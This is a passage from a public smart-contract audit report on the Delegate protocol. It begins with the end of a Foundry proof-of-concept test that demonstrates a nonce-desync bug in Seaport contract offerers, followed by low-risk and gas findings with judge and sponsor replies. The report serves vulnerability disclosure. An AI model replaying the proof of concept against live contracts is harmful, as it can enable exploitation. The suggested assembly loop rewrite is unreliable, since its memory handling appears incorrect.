>     ///@dev Construct and an offer item to the offer items array
>     function addOfferItem(ItemType itemType, address token, uint256 identifier, uint256 startAmount, uint256 endAmount) internal {
>         offerItem.itemType = itemType;
>         offerItem.token = token;
>         offerItem.identifierOrCriteria = identifier;
>         offerItem.startAmount = startAmount;
>         offerItem.endAmount = endAmount;
>         addOfferItem(offerItem);
>         delete offerItem;
>     }
> 
>     function addOfferItem(ItemType itemType, address token, uint256 identifier, uint256 amount) internal {
>         addOfferItem({itemType: itemType, token: token, identifier: identifier, startAmount: amount, endAmount: amount});
>     }
> 
>     function addOfferItem(ItemType itemType, uint256 identifier, uint256 startAmount, uint256 endAmount) internal {
>         if (itemType == ItemType.NATIVE) {
>             addEthOfferItem(startAmount, endAmount);
>         } else if (itemType == ItemType.ERC20) {
>             addErc20OfferItem(startAmount, endAmount);
>         } else if (itemType == ItemType.ERC1155) {
>             addErc1155OfferItem(identifier, startAmount, endAmount);
>         } else {
>             addErc721OfferItem(identifier);
>         }
>     }
> 
>     function addOfferItem(ItemType itemType, uint256 identifier, uint256 amt) internal {
>         addOfferItem(itemType, identifier, amt, amt);
>     }
> 
>     function addErc721OfferItem(uint256 identifier) internal {
>         addErc721OfferItem(address(mockERC721), identifier);
>     }
> 
>     function addErc721OfferItem(address token, uint256 identifier) internal {
>         addErc721OfferItem(token, identifier, 1, 1);
>     }
> 
>     function addErc721OfferItem(address token, uint256 identifier, uint256 amount) internal {
>         addErc721OfferItem(token, identifier, amount, amount);
>     }
> 
>     function addErc721OfferItem(address token, uint256 identifier, uint256 startAmount, uint256 endAmount) internal {
>         addOfferItem(ItemType.ERC721, token, identifier, startAmount, endAmount);
>     }
> 
>     function addErc1155OfferItem(uint256 tokenId, uint256 amount) internal {
>         addOfferItem(ItemType.ERC1155, address(mockERC1155), tokenId, amount, amount);
>     }
> 
>     function addErc20OfferItem(uint256 startAmount, uint256 endAmount) internal {
>         addOfferItem(ItemType.ERC20, address(mockERC20), 0, startAmount, endAmount);
>     }
> 
>     function addErc20OfferItem(uint256 amount) internal {
>         addErc20OfferItem(amount, amount);
>     }
> 
>     function addErc1155OfferItem(uint256 tokenId, uint256 startAmount, uint256 endAmount) internal {
>         addOfferItem(ItemType.ERC1155, address(mockERC1155), tokenId, startAmount, endAmount);
>     }
> 
>     function addEthOfferItem(uint256 startAmount, uint256 endAmount) internal {
>         addOfferItem(ItemType.NATIVE, address(0), 0, startAmount, endAmount);
>     }
> 
>     function addEthOfferItem(uint256 paymentAmount) internal {
>         addEthOfferItem(paymentAmount, paymentAmount);
>     }
> 
>     ///@dev add a considerationItem to the considerationItems array
>     function addConsiderationItem(ConsiderationItem memory _considerationItem) internal {
>         considerationItems.push(_considerationItem);
>     }
> 
>     ///@dev reset the considerationItems array
>     function resetConsiderationItems() internal {
>         delete considerationItems;
>     }
> 
>     ///@dev construct a considerationItem and add it to the considerationItems array
>     function addConsiderationItem(address payable recipient, ItemType itemType, address token, uint256 identifier, uint256 startAmount, uint256 endAmount) internal {
>         considerationItem.itemType = itemType;
>         considerationItem.token = token;
>         considerationItem.identifierOrCriteria = identifier;
>         considerationItem.startAmount = startAmount;
>         considerationItem.endAmount = endAmount;
>         considerationItem.recipient = recipient;
>         addConsiderationItem(considerationItem);
>         delete considerationItem;
>     }
> 
>     function addConsiderationItem(address payable recipient, ItemType itemType, uint256 identifier, uint256 amt) internal {
>         if (itemType == ItemType.NATIVE) {
>             addEthConsiderationItem(recipient, amt);
>         } else if (itemType == ItemType.ERC20) {
>             addErc20ConsiderationItem(recipient, amt);
>         } else if (itemType == ItemType.ERC1155) {
>             addErc1155ConsiderationItem(recipient, identifier, amt);
>         } else {
>             addErc721ConsiderationItem(recipient, identifier);
>         }
>     }
> 
>     function addEthConsiderationItem(address payable recipient, uint256 paymentAmount) internal {
>         addConsiderationItem(recipient, ItemType.NATIVE, address(0), 0, paymentAmount, paymentAmount);
>     }
> 
>     function addEthConsiderationItem(address payable recipient, uint256 startAmount, uint256 endAmount) internal {
>         addConsiderationItem(recipient, ItemType.NATIVE, address(0), 0, startAmount, endAmount);
>     }
> 
>     function addErc20ConsiderationItem(address payable receiver, uint256 startAmount, uint256 endAmount) internal {
>         addConsiderationItem(receiver, ItemType.ERC20, address(mockERC20), 0, startAmount, endAmount);
>     }
> 
>     function addErc20ConsiderationItem(address payable receiver, uint256 paymentAmount) internal {
>         addErc20ConsiderationItem(receiver, paymentAmount, paymentAmount);
>     }
> 
>     function addErc721ConsiderationItem(address payable recipient, uint256 tokenId) internal {
>         addConsiderationItem(recipient, ItemType.ERC721, address(mockERC721), tokenId, 1, 1);
>     }
> 
>     function addErc1155ConsiderationItem(address payable recipient, uint256 tokenId, uint256 amount) internal {
>         addConsiderationItem(recipient, ItemType.ERC1155, address(mockERC1155), tokenId, amount, amount);
>     }
> 
>     receive() external payable {}
> 
>     /// @dev Example of setting up one order
>     function test_single_POC() public {
>         TestContractOffererNativeToken contractOfferer1 = new TestContractOffererNativeToken(
>                 address(seaport),
>                 "contractOffer1"
>             );
>         vm.deal(address(contractOfferer1), 100 ether);
> 
>         mockERC721.setApprovalForAll(address(contractOfferer1), true);
>         mockERC721.setApprovalForAll(address(seaport), true);
>         mockERC721.mint(address(this), 1);
> 
>         addEthOfferItem(1 ether);
>         addErc721ConsiderationItem(payable(address(contractOfferer1)), 1);
> 
>         OrderParameters memory orderParameters1 = OrderParameters(
>             address(contractOfferer1),
>             address(0),
>             offerItems,
>             considerationItems,
>             OrderType.CONTRACT,
>             block.timestamp,
>             block.timestamp + 1000,
>             bytes32(0),
>             0,
>             bytes32(0),
>             considerationItems.length
>         );
> 
>         AdvancedOrder memory advancedOrder1 = AdvancedOrder(orderParameters1, 1, 1, "", "");
> 
>         FulfillmentComponent[][] memory offerFulfillments = new FulfillmentComponent[][](1);
>         offerFulfillments[0] = new FulfillmentComponent[](1);
>         offerFulfillments[0][0] = FulfillmentComponent(0, 0);
> 
>         // Create considerationFulfillments 2D array similarly
>         FulfillmentComponent[][] memory considerationFulfillments = new FulfillmentComponent[][](1);
>         considerationFulfillments[0] = new FulfillmentComponent[](1);
>         considerationFulfillments[0][0] = FulfillmentComponent(0, 0);
> 
>         // contractOfferer1.setRevert(true);
> 
>         AdvancedOrder[] memory orders = new AdvancedOrder[](1);
>         orders[0] = advancedOrder1;
> 
>         seaport.fulfillAvailableAdvancedOrders(orders, new CriteriaResolver[](0), offerFulfillments, considerationFulfillments, bytes32(0), address(this), 100);
>     }
> 
>     function test_POC() public {
>         TestContractOffererNativeToken contractOfferer1 = new TestContractOffererNativeToken(
>                 address(seaport),
>                 "contractOffer1"
>             );
>         vm.deal(address(contractOfferer1), 100 ether);
> 
>         mockERC721.setApprovalForAll(address(contractOfferer1), true);
>         mockERC721.setApprovalForAll(address(seaport), true);
>         mockERC721.mint(address(this), 1);
> 
>         console2.log("mockERC721.ownerOf(1)", mockERC721.ownerOf(1));
> 
>         addEthOfferItem(1 ether);
>         addErc721ConsiderationItem(payable(address(contractOfferer1)), 1);
> 
>         OrderParameters memory orderParameters1 = OrderParameters(
>             address(contractOfferer1),
>             address(0),
>             offerItems,
>             considerationItems,
>             OrderType.CONTRACT,
>             block.timestamp,
>             block.timestamp + 1000,
>             bytes32(0),
>             0,
>             bytes32(0),
>             considerationItems.length
>         );
> 
>         AdvancedOrder memory advancedOrder1 = AdvancedOrder(orderParameters1, 1, 1, "", "");
> 
>         resetOfferItems();
>         resetConsiderationItems();
> 
>         TestContractOffererNativeToken contractOfferer2 = new TestContractOffererNativeToken(
>                 address(seaport),
>                 "contractOffer2"
>             );
>         vm.deal(address(contractOfferer2), 100 ether);
> 
>         mockERC721.setApprovalForAll(address(contractOfferer2), true);
>         mockERC721.setApprovalForAll(address(seaport), true);
>         mockERC721.mint(address(this), 2);
> 
>         addEthOfferItem(1 ether);
>         addErc721ConsiderationItem(payable(address(contractOfferer2)), 2);
> 
>         console2.log("mockERC721.ownerOf(2)", mockERC721.ownerOf(2));
> 
>         contractOfferer1.setRevert(true);
> 
>         OrderParameters memory orderParameters2 = OrderParameters(
>             address(contractOfferer2),
>             address(0),
>             offerItems,
>             considerationItems,
>             OrderType.CONTRACT,
>             block.timestamp,
>             block.timestamp + 1000,
>             bytes32(0),
>             0,
>             bytes32(0),
>             considerationItems.length
>         );
> 
>         AdvancedOrder memory advancedOrder2 = AdvancedOrder(orderParameters2, 1, 1, "", "");
> 
>         // FulfillmentComponent[][] memory offerFulfillments = new FulfillmentComponent[][](2);
>         // offerFulfillments[0] = new FulfillmentComponent[](2);
>         // offerFulfillments[0][0] = FulfillmentComponent(1, 0);
>         // offerFulfillments[0][1] = FulfillmentComponent(1, 1);
> 
>         // // Create considerationFulfillments 2D array similarly
>         // FulfillmentComponent[][] memory considerationFulfillments = new FulfillmentComponent[][](2);
>         // considerationFulfillments[0] = new FulfillmentComponent[](2);
>         // considerationFulfillments[0][0] = FulfillmentComponent(1, 0);
>         // considerationFulfillments[0][1] = FulfillmentComponent(1, 1);
> 
>         FulfillmentComponent[][] memory offerFulfillments = new FulfillmentComponent[][](2);
>         offerFulfillments[0] = new FulfillmentComponent[](offerItems.length);
>         offerFulfillments[1] = new FulfillmentComponent[](offerItems.length);
> 
>         FulfillmentComponent[][] memory considerationFulfillments = new FulfillmentComponent[][](2);
>         considerationFulfillments[0] = new FulfillmentComponent[](considerationItems.length);
>         considerationFulfillments[1] = new FulfillmentComponent[](considerationItems.length);
> 
>         for (uint256 i = 0; i < offerItems.length; i++) {
>             offerFulfillments[0][i] = FulfillmentComponent(0, i);
>         }
> 
>         for (uint256 i = 0; i < considerationItems.length; i++) {
>             considerationFulfillments[0][i] = FulfillmentComponent(0, i);
>         }
> 
>         for (uint256 i = 0; i < offerItems.length; i++) {
>             offerFulfillments[1][i] = FulfillmentComponent(1, i);
>         }
> 
>         for (uint256 i = 0; i < considerationItems.length; i++) {
>             considerationFulfillments[1][i] = FulfillmentComponent(1, i);
>         }
> 
>         AdvancedOrder[] memory orders = new AdvancedOrder[](2);
>         orders[0] = advancedOrder1;
>         orders[1] = advancedOrder2;
> 
>         console2.log("mockERC721.ownerOf(1)", mockERC721.ownerOf(1));
>         console2.log("mockERC721.ownerOf(2)", mockERC721.ownerOf(2));
> 
>         seaport.fulfillAvailableAdvancedOrders(orders, new CriteriaResolver[](0), offerFulfillments, considerationFulfillments, bytes32(0), address(this), 100);
> 
> 
> 
>         uint256 seaport_contrat_offer_1_nonce = seaport.getContractOffererNonce(address(contractOfferer1));
>         console2.log(seaport_contrat_offer_1_nonce); // the nonce of contract offerer on seaport is 1 is 1!!
>         uint256 oldNonce = contractOfferer1.nonce(); // the none of contract offerer 1 is 0!
>         console2.log(oldNonce);
> 
>         // Proof also by showing that we can re-do Order 1 but nonces are deSynched
>         console2.log("mockERC721.ownerOf(1)", mockERC721.ownerOf(1));
>         console2.log("mockERC721.ownerOf(2)", mockERC721.ownerOf(2));
> 
>     }
> }
> 
> ```
> </details>



***

# Low Risk and Non-Critical Issues

For this audit, 10 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2023-09-delegate-findings/issues/293) by **DadeKuma** received the top score from the judge.

*The following wardens also submitted reports: [p0wd3r](https://github.com/code-423n4/2023-09-delegate-findings/issues/5), [gkrastenov](https://github.com/code-423n4/2023-09-delegate-findings/issues/369), [Fulum](https://github.com/code-423n4/2023-09-delegate-findings/issues/357), [sces60107](https://github.com/code-423n4/2023-09-delegate-findings/issues/354), [Brenzee](https://github.com/code-423n4/2023-09-delegate-findings/issues/353), [kodyvim](https://github.com/code-423n4/2023-09-delegate-findings/issues/176), [lsaudit](https://github.com/code-423n4/2023-09-delegate-findings/issues/172), [ladboy233](https://github.com/code-423n4/2023-09-delegate-findings/issues/96), and [lodelux](https://github.com/code-423n4/2023-09-delegate-findings/issues/79).*

## [01] `previewOrder` should not revert

The official [documentation](https://github.com/ProjectOpenSea/seaport/blob/main/docs/SeaportDocumentation.md#arguments-and-basic-functionality) says that `previewOrder` should not revert, as it may cause issues to the caller:

> An optimal Seaport app should return an order with penalties when its previewOrder function is called with unacceptable minimumReceived and maximumSpent arrays, so that the caller can learn what the Seaport app expects. But it should revert when its generateOrder is called with unacceptable minimumReceived and maximumSpent arrays, so the function fails fast, gets skipped, and avoids wasting gas by leaving the validation to Seaport.

```solidity
function previewOrder(address caller, address, SpentItem[] calldata minimumReceived, SpentItem[] calldata maximumSpent, bytes calldata context)
    external
    view
    onlySeaport(caller)
    returns (SpentItem[] memory offer, ReceivedItem[] memory consideration)
{
    if (context.length != 160) revert Errors.InvalidContextLength();
    (offer, consideration) = Helpers.processSpentItems(minimumReceived, maximumSpent);
}
```

https://github.com/code-423n4/2023-09-delegate/blob/main/src/CreateOfferer.sol#L176-L184

## [02] Withdraw should revert with non-supported `delegationType`

There seems to be no way to create a DelegateToken that is not ERC721/ERC20/ERC1155, but due to the fact that `DelegationType` supports also `ALL` and `CONTRACT`:

```solidity
enum DelegationType {
    NONE,
    ALL,
    CONTRACT,
    ERC721,
    ERC20,
    ERC1155
}
```

And there are multiple ways to create DelegateToken (e.g. `DelegateToken.create` and `CreateOfferer.transferFrom`, but more contracts could be created in the future), it would be safer to revert the transaction on withdraw to avoid burning unsupported tokens:

```solidity
function withdraw(uint256 delegateTokenId) external nonReentrant {
    ...
    } else if (delegationType == IDelegateRegistry.DelegationType.ERC1155) {
        uint256 erc1155UnderlyingAmount = StorageHelpers.readUnderlyingAmount(delegateTokenInfo, delegateTokenId);
        StorageHelpers.writeUnderlyingAmount(delegateTokenInfo, delegateTokenId, 0); // Deletes amount
        uint256 erc11551UnderlyingTokenId = RegistryHelpers.loadTokenId(delegateRegistry, registryHash);
        RegistryHelpers.decrementERC1155(
            delegateRegistry, registryHash, delegateTokenHolder, underlyingContract, erc11551UnderlyingTokenId, erc1155UnderlyingAmount, underlyingRights
        );
        StorageHelpers.burnPrincipal(principalToken, principalBurnAuthorization, delegateTokenId);
        IERC1155(underlyingContract).safeTransferFrom(address(this), msg.sender, erc11551UnderlyingTokenId, erc1155UnderlyingAmount, "");
    }
/* @audit Should revert here to avoid burning a not supported delegate token
    else {
        revert Errors.InvalidTokenType(delegationType);
    }
*/
}
```

https://github.com/code-423n4/2023-09-delegate/blob/main/src/DelegateToken.sol#L353-L386

## [03] Lack of `data` on flashloan could make some ERC1155 unusable

When doing an ERC1155 flashloan, the data parameter is always empty:

```solidity
IERC1155(info.tokenContract).safeTransferFrom(address(this), info.receiver, info.tokenId, info.amount, "");
```

https://github.com/code-423n4/2023-09-delegate/blob/main/src/DelegateToken.sol#L406

Some collections might need this parameter to be usable. This is an [example](https://etherscan.io/tx/0xd067dbef589678ad1c138e007fee644f1b5ed350043551983c90b9e46071fed2) of such case:

1. The sender transfers ERC1155 from the OpenSea contract to the ApeGang contract
2. In the same transaction the ApeGang's onERC1155BatchReceived hook is called
3. This allows the ApeGang to react to the token being received
4. The data includes merkle proofs that are needed to validate the transaction

Consider adding a `flashloanData` parameter to `Structs.FlashInfo` and pass it while transfering.

## [04] Using `delegatecall` inside a loop may cause issues with `payable` functions

If one of the `delegatecall` consumes part of the `msg.value`, other calls might fail, if they expect the full `msg.value`. Consider using a different design, or fully document this decision to avoid potential issues.

```solidity
function multicall(bytes[] calldata data) external payable override returns (bytes[] memory results) {
    results = new bytes[](data.length);
    bool success;
    unchecked {
        for (uint256 i = 0; i < data.length; ++i) {
            //slither-disable-next-line calls-loop,delegatecall-loop
            (success, results[i]) = address(this).delegatecall(data[i]);
            if (!success) revert MulticallFailed();
        }
    }
}
```

https://github.com/delegatexyz/delegate-registry/blob/6d1254de793ccc40134f9bec0b7cb3d9c3632bc1/src/DelegateRegistry.sol#L37

## [05] `CreateOfferer` uses a custom context implementation instead of an existing SIP

It is suggested to use an existing [SIP implementation](https://github.com/ProjectOpenSea/SIPs/blob/main/SIPS/sip-7.md) instead of creating a new standard from scratch, which might be prone to errors:

```solidity
Structs.Context memory decodedContext = abi.decode(context, (Structs.Context));
```

https://github.com/code-423n4/2023-09-delegate/blob/main/src/CreateOfferer.sol#L59

Please note that the contract needs to be SIP compliant before it's possible to implement SIP-7, as it requires SIP-5 and SIP-6. 

The issue describing non-compliance is described here: [`#280`](https://github.com/code-423n4/2023-09-delegate-findings/issues/280).

**[0xfoobar (Delegate) commented](https://github.com/code-423n4/2023-09-delegate-findings/issues/293#issuecomment-1724128834):**
 > Useful QA report.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-09-delegate-findings/issues/293#issuecomment-1732627819):**
 > **[01] previewOrder should not revert**<br>
> Low
> 
> **[02] Withdraw should revert with a not supported delegationType**<br>
> Refactoring
> 
> **[03] Lack of data on flashloan could make some ERC1155 unusable**<br>
> Low
> 
> **[04] Using delegatecall inside a loop may cause issues with payable functions**<br>
> Refactoring
> 
> **[05] CreateOfferer uses a custom context implementation instead of an existing SIP**<br>
> Low
> 
> The following downgraded submissions from the warden were also considered in scoring:
> - [Seaport orders will not work with USDT](https://github.com/code-423n4/2023-09-delegate-findings/issues/259)
> - [DelegateToken is not EIP-721 compliant](https://github.com/code-423n4/2023-09-delegate-findings/issues/260)
> - [Rebasing tokens remain permanently locked inside DelegateToken](https://github.com/code-423n4/2023-09-delegate-findings/issues/264)
> - [ETH can be permanently locked during a flashloan](https://github.com/code-423n4/2023-09-delegate-findings/issues/267)
> - [Principal token can be permanently locked](https://github.com/code-423n4/2023-09-delegate-findings/issues/269)
> - [CreateOfferer is not SIP-compliant, which can cause integration issues with third parties](https://github.com/code-423n4/2023-09-delegate-findings/issues/280)
> 
> Total: 6+ Low and 2 Refactoring
> 
> By far the best submission, great work!

**[0xfoobar (Delegate) acknowledged and commented](https://github.com/code-423n4/2023-09-delegate-findings/issues/293#issuecomment-1745886019):**
 > **[01] previewOrder should not revert**<br>
> The quoted documentation actually says it can revert, we're not doing order penalties here just straightforward fulfillment.
> 
> **[02] Withdraw should revert with non-supported delegationType**<br>
> It does.
> 
> **[03] Lack of data on flashloan could make some ERC1155 unusable**<br>
> Acknowledged, we won't be transferring directly to staking contracts with merkle roots so this is fine.
> 
> **[04] Using delegatecall inside a loop may cause issues with payable functions**<br>
> But here it does not, we can see in the quoted code that it's not looping over `msg.value`.
> 
> **[05] CreateOfferer uses a custom context implementation instead of an existing SIP**<br>
> Acknowledged.



***

# Gas Optimizations

For this audit, 2 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2023-09-delegate-findings/issues/78) by **Sathish9098** received the top score from the judge.

*The following warden also submitted a report: [Baki](https://github.com/code-423n4/2023-09-delegate-findings/issues/380).*

## [G-01] Structs can be packed into fewer storage slots

### Saves `6000 GAS`, `3 SLOT`

Each slot saved can avoid an extra Gsset (20000 gas) for the first setting of the struct.

Subsequent reads as well as writes have smaller gas savings.

### `expiry` can be uint96 instead of `uint256` :  Saves `2000 GAS`, `1 SLOT`

https://github.com/code-423n4/2023-09-delegate/blob/a6dbac8068760ee4fc5bababb57e3fe79e5eeb2e/src/libraries/DelegateTokenLib.sol#L20-L29

A `uint96` can store values from `0 to 2^96 - 1`, which is a very large range. However, it's important to note that Ethereum's `block.timestamp` is a `Unix timestamp`, which represents time in seconds.

A `uint96` would overflow after approximately `2,508,149,904,626,209 years` when storing time in seconds.  This is an extremely long time frame, and it's highly unlikely that Ethereum or any blockchain system will remain unchanged for such an extended period.

```diff
FILE: 2023-09-delegate/src/libraries/DelegateTokenLib.sol

20: struct DelegateInfo {
21:        address principalHolder;
22:        IDelegateRegistry.DelegationType tokenType;
23:        address delegateHolder;
24:        uint256 amount;
25:        address tokenContract;
+ 28:        uint96 expiry;
26:        uint256 tokenId;
27:        bytes32 rights;
- 28:        uint256 expiry;
29:    }
```

### `signerSalt`, `expiryLength` can be `uint128` instead of `uint256` : Saves `4000 GAS`, `2 SLOT`

https://github.com/code-423n4/2023-09-delegate/blob/a6dbac8068760ee4fc5bababb57e3fe79e5eeb2e/src/libraries/CreateOffererLib.sol#L89-L105

In many blockchain protocols, the usage of `salt` often involves values within the range of `uint32`, as they provide a sufficient numeric space for generating unique salts. Therefore, adopting a uint32 data type for the signerSalt field is a reasonable choice, as it aligns with common practices and conserves storage resources.

For the `expiryLength` field, which is intended to store the `duration` or `length` of an `expiration period`, using `uint128` is more than adequate. This choice allows for a vast range of possible expiration lengths, accommodating a wide spectrum of use cases without incurring unnecessary storage overhead

```diff
FILE: 2023-09-delegate/src/libraries/CreateOffererLib.sol

89: struct Context {
90:        bytes32 rights;
+ 91:        uint128 signerSalt;
+ 92:        uint128 expiryLength;
- 91:        uint256 signerSalt;
- 92:        uint256 expiryLength;
93:        CreateOffererEnums.ExpiryType expiryType;
94:        CreateOffererEnums.TargetToken targetToken;
95:    }


98: struct Order {
99:        bytes32 rights;
- 100:        uint256 expiryLength;
- 101:        uint256 signerSalt;
+ 100:        uint128 expiryLength;
+ 101:        uint128 signerSalt;
102:        address tokenContract;
103:        CreateOffererEnums.ExpiryType expiryType;
104:        CreateOffererEnums.TargetToken targetToken;
105:    }

```

## [G-02] Remove or replace unused state variables

### Saves `20000 GAS`

Saves a storage slot. If the variable is assigned a non-zero value, saves `Gsset (20000 gas)`. If it's assigned a zero value, saves `Gsreset (2900 gas)`. If the variable remains unassigned, there is no gas savings unless the variable is public, in which case the compiler-generated non-payable getter deployment cost is saved. If the state variable is overriding an interface's public function, mark the variable as constant or immutable so that it does not use a storage slot

```solidity
FILE: delegate-registry/src/DelegateRegistry.sol

18: mapping(bytes32 delegationHash => bytes32[5] delegationStorage) internal delegations;

```
https://github.com/delegatexyz/delegate-registry/blob/6d1254de793ccc40134f9bec0b7cb3d9c3632bc1/src/DelegateRegistry.sol#L18

## [G-03] State variables should be cached 

### Saves `300 GAS`, `3 SLOD`

Caching of a state variable replaces each Gwarmaccess (100 gas) with a cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.

### `nonce.value`, `receivers.targetTokenReceiver`, `receivers.fulfiller`  should be cached : Saves `300 GAS`, `3 SLOD`

https://github.com/code-423n4/2023-09-delegate/blob/a6dbac8068760ee4fc5bababb57e3fe79e5eeb2e/src/libraries/CreateOffererLib.sol#L185

```diff
FILE: 2023-09-delegate/src/libraries/CreateOffererLib.sol

+ uint256 value_ = nonce.value ;
- 185: if (nonce.value != contractNonce) revert CreateOffererErrors.InvalidContractNonce(nonce.value, contractNonce);
+ 185: if (value_ != contractNonce) revert CreateOffererErrors.InvalidContractNonce(value_, contractNonce);


+ address targetTokenReceiver_ = receivers.targetTokenReceiver ;
+ address fulfiller_ = receivers.fulfiller;
289: //slither-disable-start timestamp
300:        if (
            keccak256(
                abi.encode(
                    IDelegateTokenStructs.DelegateInfo({
                        tokenType: tokenType,
-                         principalHolder: decodedContext.targetToken == CreateOffererEnums.TargetToken.principal 
  ? receivers.targetTokenReceiver : receivers.fulfiller,
+                         principalHolder: decodedContext.targetToken == CreateOffererEnums.TargetToken.principal 
  ? targetTokenReceiver_  : fulfiller_ ,
-                        delegateHolder: decodedContext.targetToken == CreateOffererEnums.TargetToken.delegate ? receivers.targetTokenReceiver : receivers.fulfiller,
+                        delegateHolder: decodedContext.targetToken == CreateOffererEnums.TargetToken.delegate ? targetTokenReceiver_  : fulfiller_ ,
                        expiry: CreateOffererHelpers.calculateExpiry(decodedContext.expiryType, decodedContext.expiryLength),
                        rights: decodedContext.rights,
                        tokenContract: consideration.token,
                        tokenId: (tokenType != IDelegateRegistry.DelegationType.ERC20) ? consideration.identifier : 0,
                        amount: (tokenType != IDelegateRegistry.DelegationType.ERC721) ? consideration.amount : 0
                    })
                )
            ) != keccak256(abi.encode(IDelegateToken(delegateToken).getDelegateInfo(DelegateTokenHelpers.delegateIdNoRevert(address(this), identifier))))
        ) revert CreateOffererErrors.DelegateInfoInvariant();
```

## [G-04] Use assembly for loops to save gas

### Saves `2450 GAS` for every iteration from `7 instances`

Assembly is more gas efficient for loops. Saves minimum `350 GAS` per iteration as per remix gas checks.

```solidity
FILE: Breadcrumbsdelegate-registry/src/DelegateRegistry.sol

- 35: for (uint256 i = 0; i < data.length; ++i) {
-                //slither-disable-next-line calls-loop,delegatecall-loop
-                (success, results[i]) = address(this).delegatecall(data[i]);
-                if (!success) revert MulticallFailed();
-            }

+ assembly {
+    // Load the length of the data array
+    let dataSize := mload(data)
+
+    // Initialize the results array
+    let results := mload(0x40)
+    mstore(results, dataSize)
+
+    // Initialize a counter (i) to zero
+    let i := 0
+
+    for { } lt(i, dataSize) { } {
+        // Start loop
+
+        // Load the next calldata from the data array
+        let calldataPtr := add(add(data, 0x20), mul(i, 0x20))
+        let calldataSize := mload(calldataPtr)
+
+        // Perform delegatecall
+        let success := delegatecall(gas(), address(), add(calldataPtr, 0x04), calldataSize, 0, 0)
+
+        // Store the result and check for success
+        if iszero(success) {
+            // Revert if delegatecall fails
+            revert(0, 0)
+        }
+        mstore(add(results, mul(i, 0x20)), success)
+
+        // Increment the counter
+        i := add(i, 1)
+
+        // End loop
+    }
+
+    // results contains the success status of each delegatecall
+
+ }

275:  for (uint256 i = 0; i < hashes.length; ++i) {

312: for (uint256 i = 0; i < length; ++i) {
                tempLocation = locations[i];
                assembly {
                    tempValue := sload(tempLocation)
                }
                contents[i] = tempValue;
            }

386: for (uint256 i = 0; i < hashesLength; ++i) {
                hash = hashes[i];
                if (_invalidFrom(_loadFrom(Hashes.location(hash)))) continue;
                filteredHashes[count++] = hash;
            }

393:  for (uint256 i = 0; i < count; ++i) {
                hash = filteredHashes[i];
                location = Hashes.location(hash);
                (address from, address to, address contract_) = _loadDelegationAddresses(location);
                delegations_[i] = Delegation({
                    type_: Hashes.decodeType(hash),
                    to: to,
                    from: from,
                    rights: _loadDelegationBytes32(location, Storage.POSITIONS_RIGHTS),
                    amount: _loadDelegationUint(location, Storage.POSITIONS_AMOUNT),
                    contract_: contract_,
                    tokenId: _loadDelegationUint(location, Storage.POSITIONS_TOKEN_ID)
                });
            }

417: for (uint256 i = 0; i < hashesLength; ++i) {
                hash = hashes[i];
                if (_invalidFrom(_loadFrom(Hashes.location(hash)))) continue;
                filteredHashes[count++] = hash;
            }

423: for (uint256 i = 0; i < count; ++i) {
                validHashes[i] = filteredHashes[i];
            }

```
https://github.com/delegatexyz/delegate-registry/blob/6d1254de793ccc40134f9bec0b7cb3d9c3632bc1/src/DelegateRegistry.sol#L423-L425

## [G-05] Don't initialize default values to variables to reduce gas 

Saves ``13 GAS`` for local variable and ``2000 GAS`` for state variable 

```solidity
FILE: Breadcrumbsdelegate-registry/src/DelegateRegistry.sol

35: for (uint256 i = 0; i < data.length; ++i) {
275: for (uint256 i = 0; i < hashes.length; ++i) {
312: for (uint256 i = 0; i < length; ++i) {
386: for (uint256 i = 0; i < hashesLength; ++i) {
393: for (uint256 i = 0; i < count; ++i) {
417: for (uint256 i = 0; i < hashesLength; ++i) {
423: for (uint256 i = 0; i < count; ++i) {

```
https://github.com/delegatexyz/delegate-registry/blob/6d1254de793ccc40134f9bec0b7cb3d9c3632bc1/src/DelegateRegistry.sol#L35

## [G-06] Use constants instead of type(uintX).max to avoid calculating every time 

```solidity
FILE: delegate-registry/src/DelegateRegistry.sol

213:    ? type(uint256).max
215: if (!Ops.or(rights == "", amount == type(uint256).max)) {
217: ? type(uint256).max
232: ? type(uint256).max
234: if (!Ops.or(rights == "", amount == type(uint256).max)) {
236: ? type(uint256).max
372: uint256 cleanUpper12Bytes = type(uint256).max << 160;

```
https://github.com/delegatexyz/delegate-registry/blob/6d1254de793ccc40134f9bec0b7cb3d9c3632bc1/src/DelegateRegistry.sol#L213

## [G-07] For same condition checks use modifiers 

```solidity
File: delegate-registry/src/DelegateRegistry.sol

56: } else if (loadedFrom == msg.sender) {
75: } else if (loadedFrom == msg.sender) {
85: } else if (loadedFrom == msg.sender) {
115:  } else if (loadedFrom == msg.sender) {
118: } else if (loadedFrom == msg.sender) {
140: } else if (loadedFrom == msg.sender) {
143: } else if (loadedFrom == msg.sender) {

```
https://github.com/delegatexyz/delegate-registry/blob/6d1254de793ccc40134f9bec0b7cb3d9c3632bc1/src/DelegateRegistry.sol#L75C9-L75C47

## [G-08] Declare the variables outside the loop

Per iterations saves ``26 GAS``

```diff
FILE: delegate-registry/src/DelegateRegistry.sol

+                 bytes32 location ;
+                 address from ;
 for (uint256 i = 0; i < hashes.length; ++i) {
-                 bytes32 location = Hashes.location(hashes[i]);
-                 address from = _loadFrom(location);
+                location = Hashes.location(hashes[i]);
+                from = _loadFrom(location);
                if (_invalidFrom(from)) {
                    delegations_[i] = Delegation({type_: DelegationType.NONE, to: address(0), from: address(0), rights: "", amount: 0, contract_: address(0), tokenId: 0});
                } else {
                    (, address to, address contract_) = _loadDelegationAddresses(location);
                    delegations_[i] = Delegation({
                        type_: Hashes.decodeType(hashes[i]),
                        to: to,
                        from: from,
                        rights: _loadDelegationBytes32(location, Storage.POSITIONS_RIGHTS),
                        amount: _loadDelegationUint(location, Storage.POSITIONS_AMOUNT),
                        contract_: contract_,
                        tokenId: _loadDelegationUint(location, Storage.POSITIONS_TOKEN_ID)
                    });

```

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-09-delegate-findings/issues/78#issuecomment-1742654814):**
 > Very good work with the first 2 findings!

**[0xfoobar (Delegate) confirmed and commented](https://github.com/code-423n4/2023-09-delegate-findings/issues/78#issuecomment-1745886574):**
 > Useful findings on the gas stuff. Not sure the refactoring is worth the loss of struct ordering here but will think it over.



***

# Audit Analysis

